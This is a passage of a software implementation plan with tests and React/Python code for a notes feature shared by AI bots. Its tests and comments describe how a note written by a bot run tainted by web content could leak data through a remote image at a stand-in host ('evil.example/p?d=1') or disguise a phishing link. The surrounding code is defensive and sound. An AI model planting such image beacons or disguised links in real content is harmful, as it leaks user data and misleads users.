    created_by_bot: null, tainted: false, content: "Likes **orchids**. See [[Garden]] and [[Lisbon]].",
    links: [{ target: "garden", title: "Garden", note_id: "n2" }, { target: "lisbon", title: "Lisbon", note_id: null }],
    ...overrides,
  };
}

const onClose = vi.fn();
const onOpenNote = vi.fn();
const onCreateNote = vi.fn();

function renderEditor() {
  return render(<NoteEditor noteId="n1" onClose={onClose} onOpenNote={onOpenNote} onCreateNote={onCreateNote} />);
}

async function replaceText(text: string) {
  const user = userEvent.setup();
  const body = await screen.findByLabelText("Note text");
  await user.clear(body);
  await user.type(body, text);
  await user.tab();
  return user;
}

beforeEach(() => {
  for (const mock of [getNoteMock, saveNoteMock, onClose, onOpenNote, onCreateNote]) mock.mockReset();
  getNoteMock.mockResolvedValue(note());
});
afterEach(() => cleanup());

describe("NoteEditor", () => {
  it("saves an edit against the revision it opened when you leave the field", async () => {
    saveNoteMock.mockResolvedValue(note({ content: "Likes orchids and roses.", revision: 2 }));
    renderEditor();
    await replaceText("Likes orchids and roses.");
    await waitFor(() => expect(saveNoteMock).toHaveBeenCalledWith("n1", {
      base_revision: 1, title: "Ana", content: "Likes orchids and roses.",
    }));
    expect(await screen.findByText("Saved")).toBeInTheDocument();
    expect(saveNoteMock).toHaveBeenCalledTimes(1);
  });

  it("on a stale revision, Keep mine saves over the latest revision", async () => {
    saveNoteMock.mockRejectedValueOnce(new RevisionConflictError(note({ content: "Their text", revision: 3 })))
      .mockResolvedValue(note({ content: "Mine", revision: 4 }));
    renderEditor();
    const user = await replaceText("Mine");
    expect(await screen.findByText(/This note changed somewhere else/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Keep mine" }));
    await waitFor(() => expect(saveNoteMock).toHaveBeenLastCalledWith("n1", {
      base_revision: 3, title: "Ana", content: "Mine",
    }), { timeout: 2000 });
  });

  it("on a stale revision, Load the latest shows their copy and saves nothing more", async () => {
    saveNoteMock.mockRejectedValueOnce(new RevisionConflictError(note({ content: "Their text", revision: 3 })));
    renderEditor();
    const user = await replaceText("Mine");
    await user.click(await screen.findByRole("button", { name: "Load the latest" }));
    expect(screen.getByLabelText("Note text")).toHaveValue("Their text");
    expect(saveNoteMock).toHaveBeenCalledTimes(1);
  });

  it("previews markdown and opens a [[link]] to an existing note", async () => {
    const user = userEvent.setup();
    renderEditor();
    await user.click(await screen.findByRole("button", { name: "Preview" }));
    expect(screen.getByText("orchids").tagName).toBe("STRONG");
    await user.click(screen.getByRole("button", { name: "Garden" }));
    await waitFor(() => expect(onOpenNote).toHaveBeenCalledWith("n2"));
  });

  it("never draws a remote image, shows a link as its real host and survives a broken [[link]]", async () => {
    getNoteMock.mockResolvedValue(note({
      content: "![x](https://evil.example/p?d=1)\n\n[My bank](https://phish.example/login)\n\n[odd](#wikilink/%E0%A4)",
      links: [],
    }));
    const user = userEvent.setup();
    const { container } = renderEditor();
    await user.click(await screen.findByRole("button", { name: "Preview" }));
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[image: x]")).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "phish.example" })).toHaveAttribute("href", "https://phish.example/login");
    expect(screen.queryByText("My bank")).toBeNull();
    expect(screen.getByText("odd").tagName).toBe("SPAN");
  });

  it("offers to create a note for a [[link]] that has none yet", async () => {
    const user = userEvent.setup();
    renderEditor();
    await user.click(await screen.findByRole("button", { name: "Create note Lisbon" }));
    await waitFor(() => expect(onCreateNote).toHaveBeenCalledWith("Lisbon"));
  });

  it("saves what you typed before closing", async () => {
    saveNoteMock.mockResolvedValue(note({ content: `${note().content}!`, revision: 2 }));
    const user = userEvent.setup();
    renderEditor();
    await user.type(await screen.findByLabelText("Note text"), "!");
    await user.click(screen.getByRole("button", { name: "← Notes" }));
    await waitFor(() => expect(onClose).toHaveBeenCalled());
    expect(saveNoteMock).toHaveBeenCalledTimes(1);
  });
});
```

`web/tests/NotesBoard.test.tsx`:

```tsx
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import NotesBoard from "../src/components/notes/NotesBoard";
import type { NoteSummaryOut } from "../src/api/types";

const listNotesMock = vi.fn();
const createNoteMock = vi.fn();
const keepNoteMock = vi.fn();
vi.mock("../src/api/notes", () => ({
  listNotes: (...a: unknown[]) => listNotesMock(...a),
  createNote: (...a: unknown[]) => createNoteMock(...a),
  keepNote: (...a: unknown[]) => keepNoteMock(...a),
}));
vi.mock("../src/components/notes/NoteEditor", () => ({
  NoteEditor: ({ noteId, onClose }: { noteId: string; onClose: () => void }) => (
    <div><p>editing {noteId}</p><button type="button" onClick={onClose}>close editor</button></div>
  ),
}));
let live = { boardVersion: { tasks: 0, money: 0, notes: 0 } };
vi.mock("../src/hooks/useLiveStore", () => ({ useLiveState: () => live }));

function summary(overrides: Partial<NoteSummaryOut> = {}): NoteSummaryOut {
  return {
    id: "n1", title: "Ana", tags: ["people"], snippet: "Birthday 3 May, likes orchids", pinned: false, revision: 1,
    created_at: "2026-10-14T08:00:00Z", updated_at: "2026-10-14T08:00:00Z", created_by_bot: "b1", tainted: false,
    ...overrides,
  };
}

beforeEach(() => {
  live = { boardVersion: { tasks: 0, money: 0, notes: 0 } };
  for (const mock of [listNotesMock, createNoteMock, keepNoteMock]) mock.mockReset();
  listNotesMock.mockResolvedValue([summary(), summary({ id: "n2", title: "Recipe", tags: [], snippet: "bake", tainted: true })]);
});
afterEach(() => cleanup());

const rowOf = async (title: string) => (await screen.findByText(title)).closest("li") as HTMLElement;

describe("NotesBoard", () => {
  it("lists notes with their snippet and tags, and marks web content with Keep", async () => {
    keepNoteMock.mockResolvedValue({});
    const user = userEvent.setup();
    render(<NotesBoard />);
    const ana = await rowOf("Ana");
    expect(within(ana).getByText("Birthday 3 May, likes orchids")).toBeInTheDocument();
    expect(within(ana).getByText("#people")).toBeInTheDocument();
    expect(within(ana).queryByRole("button", { name: /^Keep/ })).not.toBeInTheDocument();
    await user.click(within(await rowOf("Recipe")).getByRole("button", { name: "Keep Recipe as yours" }));
    expect(keepNoteMock).toHaveBeenCalledWith("n2");
    expect(listNotesMock).toHaveBeenCalledWith("");
  });

  it("searches when you submit the search box", async () => {
    const user = userEvent.setup();
    render(<NotesBoard />);
    await screen.findByText("Ana");
    listNotesMock.mockResolvedValue([]);
    await user.type(screen.getByRole("searchbox", { name: "Search notes" }), "orchids{Enter}");
    await waitFor(() => expect(listNotesMock).toHaveBeenLastCalledWith("orchids"));
    expect(await screen.findByText("No note matches “orchids”.")).toBeInTheDocument();
  });

  it("opens a note in the editor and comes back to a fresh list", async () => {
    const user = userEvent.setup();
    render(<NotesBoard />);
    await user.click(within(await rowOf("Ana")).getByRole("button", { name: /Ana/ }));
    expect(screen.getByText("editing n1")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "close editor" }));
    expect(await screen.findByText("Ana")).toBeInTheDocument();
    await waitFor(() => expect(listNotesMock).toHaveBeenCalledTimes(2));
  });

  it("New note creates one and opens it", async () => {
    createNoteMock.mockResolvedValue({ id: "n9" });
    const user = userEvent.setup();
    render(<NotesBoard />);
    await user.click(await screen.findByRole("button", { name: "New note" }));
    expect(createNoteMock).toHaveBeenCalledWith({ title: "Untitled note", content: "" });
    expect(await screen.findByText("editing n9")).toBeInTheDocument();
  });

  it("reloads when a notes_changed frame arrives", async () => {
    const { rerender } = render(<NotesBoard />);
    await screen.findByText("Ana");
    live = { boardVersion: { tasks: 0, money: 0, notes: 1 } };
    rerender(<NotesBoard />);
    await waitFor(() => expect(listNotesMock).toHaveBeenCalledTimes(2));
  });
});
```

In `web/tests/live.test.ts`, change the existing expectation to `expect(afterMoney.boardVersion).toEqual({ tasks: 1, money: 1, notes: 0 });` (and any other expectation there that spells out `boardVersion` gains `notes: 0`), then add:

```ts
  it("counts notes_changed frames so the Notes tab can reload", () => {
    const next = applyFrame(initialLiveState(), { type: "notes_changed", seq: 7, change: "created", note_id: "n1" });
    expect(next.boardVersion.notes).toBe(1);
    expect(next.cursor).toBe(7);
  });
```

In `web/tests/Board.test.tsx`:
- Replace the roles mock with `vi.mock("../src/api/roles", () => ({ listRoles: () => Promise.resolve([...ROLES, NOTES_ROLE]) }));`, defining `const NOTES_ROLE = { id: "notes", name: "Notes", description: "Keeps your notes.", tools: [], board_tab: "notes" as const, needs_desk: false };` above it with `vi.hoisted`: `const { NOTES_ROLE } = vi.hoisted(() => ({ NOTES_ROLE: { … } }));`.
- Add `vi.mock("../src/components/notes/NotesBoard", () => ({ default: () => <p>the notes board</p> }));`.
- Change the empty-board expectation to `/Give Scout a role with a Board/`.
- Add:

```tsx
  it("shows a Notes tab for a bot holding the notes role, its panel loaded lazily", async () => {
    getBotMock.mockResolvedValue(makeBot({ roles: ["notes"] }));
    renderBoard();
    expect(await screen.findByRole("tab", { name: "Notes" })).toHaveAttribute("aria-selected", "true");
    expect(await screen.findByText("the notes board")).toBeInTheDocument();
  });
```

Append to `tests/test_static.py`:

```python
def test_the_spa_never_loads_remote_images(tmp_path, monkeypatch):
    """M2 Task 5: a note's markdown must never make the browser fetch a remote
    image (an exfiltration path for a tainted run's note). The preview draws no
    <img>; this header is the second line of defense."""
    client = TestClient(_app_with_dist(monkeypatch, _built_dist(tmp_path)))
    for path in ("/", "/bots/some-fake-id/board"):
        assert client.get(path).headers["content-security-policy"] == "img-src 'self' data: blob:"
```

- [ ] **Step 5: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost/web && npx vitest run tests/conflict.test.ts tests/noteText.test.ts tests/NoteEditor.test.tsx tests/NotesBoard.test.tsx tests/live.test.ts tests/Board.test.tsx`
Expected: FAIL. You should see unresolved imports (`../src/api/conflict`, `NotePreview`, `NoteEditor`, `NotesBoard`), `ApiError` with no `body`, and no Notes tab.

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_static.py -q`
Expected: FAIL with `KeyError: 'content-security-policy'`, because today the static mount sends no CSP.

- [ ] **Step 6: API, types, live store**

`web/src/api/client.ts`: give `ApiError` a third constructor parameter `body: unknown = undefined`, stored as `readonly body: unknown`. Replace `parseErrorDetail` and the tail of `apiRequest` with:

```ts
async function parseError(response: Response): Promise<{ message: string; body: unknown }> {
  const fallback = `Request failed (${response.status})`;
  try {
    const body: unknown = await response.json();
    const detail = (body as { detail?: unknown } | null)?.detail;
    return { message: typeof detail === "string" ? detail : fallback, body };
  } catch {
    // Non-JSON error body — the generic message, no body.
    return { message: fallback, body: undefined };
  }
}

async function readResponse<T>(response: Response): Promise<T> {
  if (!response.ok) {
    const { message, body } = await parseError(response);
    throw new ApiError(response.status, message, body);
  }
  if (response.status === 204) {
    return undefined as T;
  }
  return (await response.json()) as T;
}
```

Then make `apiRequest` end with `return readResponse<T>(response);`, and add:

```ts
// A raw upload (a PDF file, M2): the body goes as-is with its own content type.
export async function apiUpload<T>(path: string, file: Blob, contentType: string): Promise<T> {
  const response = await fetch(path, {
    method: "POST", credentials: "include", headers: { "Content-Type": contentType }, body: file,
  });
  return readResponse<T>(response);
}
```

`web/src/api/conflict.ts`:

```ts
import { ApiError } from "./client";

// A save that carried a stale revision (M2 D4): the gateway answers 409 with
// the stored copy, so the editor can offer "Load the latest" or "Keep mine".
export class RevisionConflictError<T> extends Error {
  readonly current: T;

  constructor(current: T) {
    super("This changed somewhere else since you opened it.");
    this.name = "RevisionConflictError";
    this.current = current;
  }
}

function conflictBody(err: unknown): { current: unknown } | null {
  if (!(err instanceof ApiError) || err.status !== 409) return null;
  const body = err.body;
  return typeof body === "object" && body !== null && "current" in body ? (body as { current: unknown }) : null;
}

export async function withConflict<T, C>(request: Promise<T>): Promise<T> {
  try {
    return await request;
  } catch (err) {
    const conflict = conflictBody(err);
    if (conflict) throw new RevisionConflictError<C>(conflict.current as C);
    throw err;
  }
}
```

`web/src/api/notes.ts`:

```ts
import { apiRequest } from "./client";
import { withConflict } from "./conflict";
import type { NoteOut, NoteSummaryOut } from "./types";

// The user's notes (M2 D1/D4): the same records every notes-role bot works on.

export interface NoteIn {
  title?: string | null;
  content: string;
  tags?: string[];
}

export interface NoteSaveIn {
  base_revision: number;
  title?: string;
  content?: string;
  tags?: string[];
  pinned?: boolean;
}

const path = (noteId: string) => `/api/notes/${encodeURIComponent(noteId)}`;

export function listNotes(query = ""): Promise<NoteSummaryOut[]> {
  const q = query.trim();
  return apiRequest<NoteSummaryOut[]>("GET", q ? `/api/notes?q=${encodeURIComponent(q)}` : "/api/notes");
}

export function getNote(noteId: string): Promise<NoteOut> {
  return apiRequest<NoteOut>("GET", path(noteId));
}

export function createNote(input: NoteIn): Promise<NoteOut> {
  return apiRequest<NoteOut>("POST", "/api/notes", input);
}

// A stale base_revision throws RevisionConflictError<NoteOut> carrying the stored note.
export function saveNote(noteId: string, input: NoteSaveIn): Promise<NoteOut> {
  return withConflict<NoteOut, NoteOut>(apiRequest<NoteOut>("PUT", path(noteId), input));
}

// Keep: the user vouches for a note marked "from web content" (only here — no bot can).
export function keepNote(noteId: string): Promise<NoteOut> {
  return apiRequest<NoteOut>("POST", `${path(noteId)}/keep`);
}

export function deleteNote(noteId: string): Promise<void> {
  return apiRequest<void>("DELETE", path(noteId));
}
```

In `web/src/api/types.ts`: `export type BoardTab = "tasks" | "money" | "notes";` and add:

```ts
// The user's notes (M2 D1/D4).
export interface NoteLinkOut {
  target: string; // the folded [[target]]
  title: string; // as written
  note_id: string | null; // null: no note has that title yet
}

export interface NoteSummaryOut {
  id: string;
  title: string;
  tags: string[];
  snippet: string;
  pinned: boolean;
  revision: number;
  created_at: string;
  updated_at: string;
  created_by_bot: string | null;
  tainted: boolean;
}

export interface NoteOut extends NoteSummaryOut {
  content: string;
  links: NoteLinkOut[];
}

export interface NotesChangedFrame {
  type: "notes_changed";
  seq: number;
  change: "created" | "updated" | "deleted";
  note_id: string;
}
```

Add `| NotesChangedFrame` to `ServerFrame`.

In `web/src/store/live.ts`:
- The type becomes `boardVersion: Readonly<{ tasks: number; money: number; notes: number }>`.
- `initialLiveState` sets `boardVersion: { tasks: 0, money: 0, notes: 0 }`.
- The header comment lists `notes_changed`.
- Add:

```ts
    case "notes_changed":
      return { ...state, cursor: frame.seq, boardVersion: { ...state.boardVersion, notes: state.boardVersion.notes + 1 } };
```

- [ ] **Step 7: Adapt the harvested helpers, then the components**

Append to `web/src/components/notes/noteHelpers.ts` (the harvested `relativeTimeAgo` and `deriveTitle` stay verbatim):

```ts
// Roost: mirrors roost/constants.py (MAX_NOTE_TITLE_LENGTH, MAX_NOTE_CONTENT_LENGTH, MAX_NOTE_QUERY_LENGTH).
export const MAX_NOTE_TITLE_LENGTH = 200;
export const MAX_NOTE_CONTENT_LENGTH = 100_000;
export const MAX_NOTE_QUERY_LENGTH = 200;

// Roost: the page key a [[wikilink]] resolves by — roost/notes/wikilinks.py's normalize_page.
export function normalizePage(name: string): string {
  return name.trim().toLowerCase().split(/\s+/).filter(Boolean).join(" ");
}

// Roost: the body without its leading --- front-matter block (the list shows tags as chips instead).
export function stripFrontMatter(content: string): string {
  const block = /^---\r?\n[\s\S]*?\r?\n---\r?\n?/.exec(content);
  return block ? content.slice(block[0].length) : content;
}
```

`web/src/components/board/ConflictNotice.tsx`:

```tsx
export interface ConflictNoticeProps {
  what: "note" | "document";
  onLoad: () => void;
  onKeep: () => void;
}

// A save met a newer copy: a bot or another window changed it (M2 D4). The user
// picks — see the latest, or save theirs over it. Never a silent overwrite.
export function ConflictNotice({ what, onLoad, onKeep }: ConflictNoticeProps) {
  return (
    <div className="conflict-notice" role="status">
      <p>This {what} changed somewhere else (a bot or another window) while you were editing.</p>
      <button type="button" className="btn btn--quiet btn--small" onClick={onLoad}>Load the latest</button>
      <button type="button" className="btn btn--primary btn--small" onClick={onKeep}>Keep mine</button>
    </div>
  );
}
```

`web/src/components/notes/useNoteDraft.ts`:

```ts
import { useCallback, useEffect, useRef, useState } from "react";
import * as notesApi from "../../api/notes";
import { describeError } from "../../api/client";
import { RevisionConflictError } from "../../api/conflict";
import type { NoteOut } from "../../api/types";

export const NOTE_AUTOSAVE_MS = 800;
export type SaveState = "saved" | "saving" | "unsaved" | "error";

export interface NoteDraft {
  base: NoteOut | null;
  title: string;
  content: string;
  conflict: NoteOut | null;
  state: SaveState;
  error: string | null;
  setTitle: (title: string) => void;
  setContent: (content: string) => void;
  flush: () => Promise<void>;
  loadLatest: () => void;
  keepMine: () => void;
}

function useLoadedNote(noteId: string) {
  const [base, setBase] = useState<NoteOut | null>(null);
  const [title, setTitle] = useState("");
  const [content, setContent] = useState("");
  const [loadError, setLoadError] = useState<string | null>(null);
  useEffect(() => {
    let live = true;
    notesApi.getNote(noteId).then((note) => {
      if (!live) return;
      setBase(note);
      setTitle(note.title);
      setContent(note.content);
    }).catch((err: unknown) => {
      if (live) setLoadError(describeError(err));
    });
    return () => { live = false; };
  }, [noteId]);
  return { base, setBase, title, setTitle, content, setContent, loadError };
}

// One note being edited (M2 D4). Title and body autosave a moment after the
// last keystroke, and on flush (blur, Close), always against the revision last
// seen. A stale revision pauses saving until the user picks "Load the latest"
// or "Keep mine".
export function useNoteDraft(noteId: string): NoteDraft {
  const loaded = useLoadedNote(noteId);
  const { base, setBase, title, content } = loaded;
  const [conflict, setConflict] = useState<NoteOut | null>(null);
  const [saving, setSaving] = useState(false);
  const [saveError, setSaveError] = useState<string | null>(null);
  const inFlight = useRef<Promise<void> | null>(null);
  const wantedTitle = title.trim() || (base?.title ?? "");
  const dirty = base !== null && (wantedTitle !== base.title || content !== base.content);

  const flush = useCallback(async () => {
    if (inFlight.current) return inFlight.current;
    if (!base || !dirty || conflict) return;
    setSaving(true);
    const run = notesApi.saveNote(base.id, { base_revision: base.revision, title: wantedTitle, content })
      .then((saved) => { setBase(saved); setSaveError(null); })
      .catch((err: unknown) => {
        if (err instanceof RevisionConflictError) setConflict(err.current as NoteOut);
        else setSaveError(describeError(err));
      })
      .finally(() => { inFlight.current = null; setSaving(false); });
    inFlight.current = run;
    return run;
  }, [base, dirty, conflict, wantedTitle, content, setBase]);

  useEffect(() => {
    if (!dirty || conflict) return undefined;
    const timer = setTimeout(() => { void flush(); }, NOTE_AUTOSAVE_MS);
    return () => clearTimeout(timer);
  }, [dirty, conflict, flush]);

  const resolve = useConflictChoices(conflict, setConflict, loaded);
  const state: SaveState = saveError ? "error" : saving ? "saving" : dirty ? "unsaved" : "saved";
  return { base, title, content, conflict, state, error: saveError ?? loaded.loadError, setTitle: loaded.setTitle,
           setContent: loaded.setContent, flush, ...resolve };
}

function useConflictChoices(
  conflict: NoteOut | null,
  setConflict: (next: NoteOut | null) => void,
  loaded: ReturnType<typeof useLoadedNote>,
) {
  const { setBase, setTitle, setContent } = loaded;
  // Theirs replaces what is on screen; nothing of mine is saved.
  const loadLatest = useCallback(() => {
    if (!conflict) return;
    setBase(conflict);
    setTitle(conflict.title);
    setContent(conflict.content);
    setConflict(null);
  }, [conflict, setBase, setTitle, setContent, setConflict]);
  // Mine stays on screen and is saved over the latest revision on the next autosave.
  const keepMine = useCallback(() => {
    if (!conflict) return;
    setBase(conflict);
    setConflict(null);
  }, [conflict, setBase, setConflict]);
  return { loadLatest, keepMine };
}
```

`web/src/lib/linkHost.ts`:

```ts
// M1's link-safety rule in one place, shared by chat bubbles (MessageRow's
// renderBody) and the note preview: a link shows its real hostname, never text
// a bot or a note chose for it, and only http(s) URLs are drawn as links.
export function linkHost(href: string | undefined): string | null {
  if (!href) return null;
  try {
    const url = new URL(href);
    return url.protocol === "http:" || url.protocol === "https:" ? url.hostname : null;
  } catch {
    return null;
  }
}
```

In `web/src/components/MessageRow.tsx`, import `linkHost` and replace the `try { parts.push({ url, host: new URL(url).hostname }); } catch { parts.push(url); }` in `renderBody` with:

```tsx
    const host = linkHost(url);
    parts.push(host ? { url, host } : url);
```

`LINK_PATTERN` only matches http(s), so chat bubbles render exactly as before (the existing MessageRow tests stay green).

`web/src/components/notes/NotePreview.tsx`:

```tsx
import type { ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { linkHost } from "../../lib/linkHost";
import { stripFrontMatter } from "./noteHelpers";
import { iterWikilinks, wikilinkHref, wikilinkLabel } from "./wikilink";

const WIKILINK_PREFIX = "#wikilink/";

// [[Target|Label]] → [Label](#wikilink/Target), so the markdown renderer hands
// it to our link component, which draws it as a chip (LazyClaw's NoteDetail
// bridge). Raw HTML in a note is never rendered (react-markdown's default).
export function withWikilinkHrefs(markdown: string): string {
  let out = "";
  let at = 0;
  for (const link of iterWikilinks(markdown)) {
    out += `${markdown.slice(at, link.start)}[${wikilinkLabel(link)}](${wikilinkHref(link.target)})`;
    at = link.end;
  }
  return out + markdown.slice(at);
}

// A hand-typed "#wikilink/%E0%A4" can't be decoded: plain text, never a crash.
function wikilinkTarget(href: string): string | null {
  try {
    return decodeURIComponent(href.slice(WIKILINK_PREFIX.length).split("#")[0]);
  } catch {
    return null;
  }
}

interface PreviewLinkProps {
  href?: string;
  onWikilink: (target: string) => void;
  children?: ReactNode;
}

// M1's rule (MessageRow's renderBody): a web link's text is its real hostname,
// never what the note says, so a note a tainted run wrote can't disguise one.
function PreviewLink({ href, onWikilink, children }: PreviewLinkProps) {
  if (href?.startsWith(WIKILINK_PREFIX)) {
    const target = wikilinkTarget(href);
    if (target === null) return <span>{children}</span>;
    return <button type="button" className="wikilink-chip" onClick={() => onWikilink(target)}>{children}</button>;
  }
  const host = linkHost(href);
  if (host === null) return <span>{children}</span>;
  return <a href={href} target="_blank" rel="noopener noreferrer" className="note-preview__link">{host}</a>;
}

export interface NotePreviewProps {
  content: string;
  onWikilink: (target: string) => void;
}

export function NotePreview({ content, onWikilink }: NotePreviewProps) {
  const components: Components = {
    a: ({ href, children }) => <PreviewLink href={href} onWikilink={onWikilink}>{children}</PreviewLink>,
    // Never fetched: opening Preview must not send anything a note names to another
    // host (M1: remote images are never rendered).
    img: ({ alt }) => <span className="note-preview__image">{`[image: ${alt || "untitled"}]`}</span>,
  };
  return (
    <div className="note-preview">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {withWikilinkHrefs(stripFrontMatter(content))}
      </ReactMarkdown>
    </div>
  );
}
```

`roost/constants.py` gains:

```python
# The SPA's Content-Security-Policy (M2 Task 5): images only from the gateway,
# data: and blob: (the PDF viewer and the Univer canvas), so markdown a note
# holds can never make the browser fetch another host.
SPA_CONTENT_SECURITY_POLICY = "img-src 'self' data: blob:"
```

In `roost/gateway/routes/static.py`, import it and send it on every SPA response, including the `index.html` fallback. Replace `_SpaStaticFiles.get_response` with:

```python
    async def get_response(self, path: str, scope: Scope):  # type: ignore[override]
        try:
            response = await super().get_response(path, scope)
        except HTTPException as exc:
            if exc.status_code != 404:
                raise
            response = FileResponse(Path(str(self.directory)) / "index.html")
        response.headers["Content-Security-Policy"] = SPA_CONTENT_SECURITY_POLICY
        return response
```

Add one sentence to the class docstring: "Every response carries the SPA's Content-Security-Policy (no remote images)."

`web/src/components/notes/WikilinkChips.tsx`:

```tsx
import type { NoteLinkOut } from "../../api/types";

export interface WikilinkChipsProps {
  links: NoteLinkOut[];
  onOpen: (noteId: string) => void;
  onCreate: (title: string) => void;
}

// The notes this one links to: open one, or create the note a link names.
export function WikilinkChips({ links, onOpen, onCreate }: WikilinkChipsProps) {
  if (links.length === 0) return null;
  return (
    <ul className="wikilink-chips" aria-label="Links">
      {links.map((link) => (
        <li key={link.target}>
          {link.note_id ? (
            <button type="button" className="wikilink-chip" onClick={() => onOpen(link.note_id as string)}>
              {link.title}
            </button>
          ) : (
            <button type="button" className="wikilink-chip wikilink-chip--new" aria-label={`Create note ${link.title}`}
              onClick={() => onCreate(link.title)}>
              + {link.title}
            </button>
          )}
        </li>
      ))}
    </ul>
  );
}
```

`web/src/components/notes/NoteEditor.tsx`:

```tsx
import { useState } from "react";
import { ConflictNotice } from "../board/ConflictNotice";
import { ErrorNotice } from "../ErrorNotice";
import { NotePreview } from "./NotePreview";
import { WikilinkChips } from "./WikilinkChips";
import { MAX_NOTE_CONTENT_LENGTH, MAX_NOTE_TITLE_LENGTH, normalizePage } from "./noteHelpers";
import { useNoteDraft, type SaveState } from "./useNoteDraft";

const SAVE_LABEL: Record<SaveState, string> = {
  saved: "Saved", saving: "Saving…", unsaved: "Unsaved changes", error: "Not saved",
};

export interface NoteEditorProps {
  noteId: string;
  onClose: () => void;
  onOpenNote: (noteId: string) => void;
  onCreateNote: (title: string) => void;
}

interface EditorBarProps {
  label: string;
  preview: boolean;
  onPreview: (preview: boolean) => void;
  onClose: () => void;
}

function EditorBar({ label, preview, onPreview, onClose }: EditorBarProps) {
  return (
    <div className="note-editor__bar">
      <button type="button" className="btn btn--quiet btn--small" onClick={onClose}>← Notes</button>
      <span className="note-editor__state" aria-live="polite">{label}</span>
      <div className="note-editor__modes" role="group" aria-label="View">
        <button type="button" className="btn btn--quiet btn--small" aria-pressed={!preview} onClick={() => onPreview(false)}>Edit</button>
        <button type="button" className="btn btn--quiet btn--small" aria-pressed={preview} onClick={() => onPreview(true)}>Preview</button>
      </div>
    </div>
  );
}

// One note: title, markdown body (or its preview), [[link]] chips, autosave.
export function NoteEditor({ noteId, onClose, onOpenNote, onCreateNote }: NoteEditorProps) {
  const draft = useNoteDraft(noteId);
  const [preview, setPreview] = useState(false);
  const leave = async (then: () => void) => { await draft.flush(); then(); };
  const openTarget = (target: string) => {
    const link = draft.base?.links.find((candidate) => candidate.target === normalizePage(target));
    void leave(() => (link?.note_id ? onOpenNote(link.note_id) : onCreateNote(target)));
  };

  if (!draft.base) return draft.error ? <ErrorNotice message={draft.error} /> : <p className="board-loading">Loading&hellip;</p>;
  const label = SAVE_LABEL[draft.state] + (draft.state === "error" && draft.error ? `: ${draft.error}` : "");
  return (
    <article className="note-editor" aria-label={`Note ${draft.base.title}`}>
      <EditorBar label={label} preview={preview} onPreview={setPreview} onClose={() => void leave(onClose)} />
      {draft.conflict ? <ConflictNotice what="note" onLoad={draft.loadLatest} onKeep={draft.keepMine} /> : null}
      <input className="note-editor__title" aria-label="Title" value={draft.title} maxLength={MAX_NOTE_TITLE_LENGTH}
        onChange={(event) => draft.setTitle(event.target.value)} onBlur={() => void draft.flush()} />
      {preview ? <NotePreview content={draft.content} onWikilink={openTarget} /> : (
        <>
          <textarea className="note-editor__body" aria-label="Note text" value={draft.content}
            maxLength={MAX_NOTE_CONTENT_LENGTH} onChange={(event) => draft.setContent(event.target.value)}
            onBlur={() => void draft.flush()} />
          <WikilinkChips links={draft.base.links} onOpen={(id) => void leave(() => onOpenNote(id))}
            onCreate={(title) => void leave(() => onCreateNote(title))} />
        </>
      )}
    </article>
  );
}
```

`web/src/components/notes/NoteList.tsx`:

```tsx
import { WebContentChip } from "../board/WebContentChip";
import { relativeTimeAgo } from "./noteHelpers";
import type { NoteSummaryOut } from "../../api/types";

export interface NoteListProps {
  notes: NoteSummaryOut[];
  onOpen: (noteId: string) => void;
  onKeep: (noteId: string) => void;
}

export function NoteList({ notes, onOpen, onKeep }: NoteListProps) {
  return (
    <ul className="note-list" aria-label="Your notes">
      {notes.map((note) => (
        <li key={note.id} className="note-row">
          <button type="button" className="note-row__open" onClick={() => onOpen(note.id)}>
            <span className="note-row__title">{note.title}</span>
            {note.snippet ? <span className="note-row__snippet">{note.snippet}</span> : null}
          </button>
          <div className="note-row__chips">
            {note.tags.map((tag) => <span key={tag} className="board-chip">#{tag}</span>)}
            <span className="note-row__when">{relativeTimeAgo(note.updated_at)}</span>
            {note.tainted ? <WebContentChip what={note.title} onKeep={() => onKeep(note.id)} /> : null}
          </div>
        </li>
      ))}
    </ul>
  );
}
```

`web/src/components/notes/NotesBoard.tsx`:

```tsx
import { useCallback, useEffect, useState } from "react";
import { ErrorNotice } from "../ErrorNotice";
import { NoteEditor } from "./NoteEditor";
import { NoteList } from "./NoteList";
import { MAX_NOTE_QUERY_LENGTH } from "./noteHelpers";
import { useLiveState } from "../../hooks/useLiveStore";
import * as notesApi from "../../api/notes";
import { describeError } from "../../api/client";
import type { NoteSummaryOut } from "../../api/types";

interface ToolbarProps {
  search: string;
  onSearch: (text: string) => void;
  onSubmit: () => void;
  onNew: () => void;
}

function NotesToolbar({ search, onSearch, onSubmit, onNew }: ToolbarProps) {
  return (
    <form role="search" className="notes-toolbar" onSubmit={(event) => { event.preventDefault(); onSubmit(); }}>
      <input type="search" aria-label="Search notes" placeholder="Search notes" value={search}
        maxLength={MAX_NOTE_QUERY_LENGTH} onChange={(event) => onSearch(event.target.value)} />
      <button type="submit" className="btn btn--quiet">Search</button>
      <button type="button" className="btn btn--primary" onClick={onNew}>New note</button>
    </form>
  );
}

interface ListAreaProps {
  notes: NoteSummaryOut[] | null;
  query: string;
  onOpen: (noteId: string) => void;
  onKeep: (noteId: string) => void;
}

function NotesListArea({ notes, query, onOpen, onKeep }: ListAreaProps) {
  if (notes === null) return <p className="board-loading">Loading&hellip;</p>;
  if (notes.length === 0) {
    return <p className="board-empty">{query ? `No note matches “${query}”.` : "No notes yet. Write one, or tell a bot “note: …” in Talk."}</p>;
  }
  return <NoteList notes={notes} onOpen={onOpen} onKeep={onKeep} />;
}

// The user's notes, shared by every bot with the notes role (M2 D4). The list
// reloads on every notes_changed frame (a bot or another window changed a note).
export default function NotesBoard() {
  const live = useLiveState();
  const [search, setSearch] = useState("");
  const [query, setQuery] = useState("");
  const [notes, setNotes] = useState<NoteSummaryOut[] | null>(null);
  const [openId, setOpenId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const fail = useCallback((err: unknown) => setError(describeError(err)), []);

  const load = useCallback(() => {
